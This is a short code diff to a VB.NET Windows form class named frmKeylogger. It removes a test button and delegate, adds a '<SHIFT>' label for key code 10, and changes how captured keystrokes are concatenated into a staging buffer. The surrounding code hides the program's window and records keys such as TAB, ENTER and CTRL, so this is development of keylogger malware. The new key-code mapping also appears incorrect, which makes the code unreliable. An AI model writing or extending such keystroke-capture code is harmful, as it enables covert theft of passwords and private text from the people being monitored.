@@ -19,19 +19,7 @@ Public Class frmKeylogger
     ' thread-safe calling for thread_hide
     Delegate Sub Change()
     Dim objchange As New Change(AddressOf DoHide)
-    Delegate Sub delTest(ByVal testPara As String)
 
-
-    Public Sub testDel(ByVal str As String)
-        MsgBox("this is a test")
-
-    End Sub
-    Private Sub BtnTest_Click(sender As Object, e As EventArgs) Handles BtnTest.Click
-        Dim d As New delTest(AddressOf testDel)
-        Dim strArr As New List(Of String)
-        strArr.Add("a")
-        Me.Invoke(d, strArr)
-    End Sub
 
     Private Sub frmKeyRogger_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
         Me.Text = "Keylogger"
@@ -167,6 +155,8 @@ Public Class frmKeylogger
                 actual = "<TAB>"
             Case 13
                 actual = "<ENTER>"
+            Case 10
+                actual = "<SHIFT>"
             Case 17
                 actual = "<CTRL>"
             Case 18
@@ -273,7 +263,7 @@ Public Class frmKeylogger
                 qux += 1
             End While
             'SetText(txtOutput.Text & buffercat)
-            stagingpoint = stagingpoint & buffercat & " "
+            stagingpoint = stagingpoint & buffercat
             buffercat = String.Empty
         End If
     End Sub
